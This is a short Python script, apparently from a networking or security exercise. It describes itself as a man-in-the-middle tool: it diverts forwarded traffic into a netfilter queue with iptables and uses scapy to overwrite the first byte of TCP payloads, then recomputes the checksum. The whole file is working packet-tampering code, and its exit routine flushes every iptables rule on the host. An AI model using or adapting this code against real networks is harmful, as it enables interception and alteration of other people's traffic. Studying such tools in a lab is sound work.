import argparse
from scapy.all import *
from netfilterqueue import NetfilterQueue as nfq


def handlePacket(packet):
    # the byte object representing the queued packet
    capturedBytes = packet.get_payload()
    # converting it to a scapy object
    convertedPacket = IP(capturedBytes)

    # only IP packets containing a TCP payload with the push flag set will be modified
    if convertedPacket.haslayer(TCP) and convertedPacket[TCP].flags == 'PA':
        tcpPayload = convertedPacket[TCP]
        # modify the TCP payload as described
        tcpPayload.payload.load = b'?' + tcpPayload.payload.load[1:]

        # since the payload has changed, the
        # checksum must be recomputed by scapy
        del convertedPacket[TCP].chksum
        # after passing the bytes object through the constructor,
        # the checksum is automatically computed
        convertedPacket = IP(bytes(convertedPacket))

        # setting the resulting bytes object as the
        # payload of the packet which will be accepted
        packet.set_payload(bytes(convertedPacket))

    # accept all packets, regardless of
    # them having been modified or not
    packet.accept()


parser = argparse.ArgumentParser(
    description='Script used in man-in-the-middle attacks, which captures IP datagrams meant to be '
                'forwarded from a target host to another and, in the case of those containing a TCP '
                'segment, alters their content by replacing the first byte of the payload with the "?" '
                'ASCII character.'
)

arguments = parser.parse_args()


print('[*] Initializing packet queue...')
packetQueue = nfq()

try:
    # only packets meant for forwarding should be captured,
    # since it is only among these were the communication
    # between the two targets takes place;
    # 17 is a prime number, so it should do nicely as a queue number
    os.system('iptables -I FORWARD -j NFQUEUE --queue-num 17')
    print('[*] IP tables updated successfully.')

    packetQueue.bind(17, handlePacket)
    print('[*] Packet queue bound successfully.')
    packetQueue.run()
except KeyboardInterrupt:
    print('[*] Unbinding queue...')
    packetQueue.unbind()

    print('[*] Resetting IP table rules...')
    os.system('iptables --flush')

    print('[*] Goodbye!')
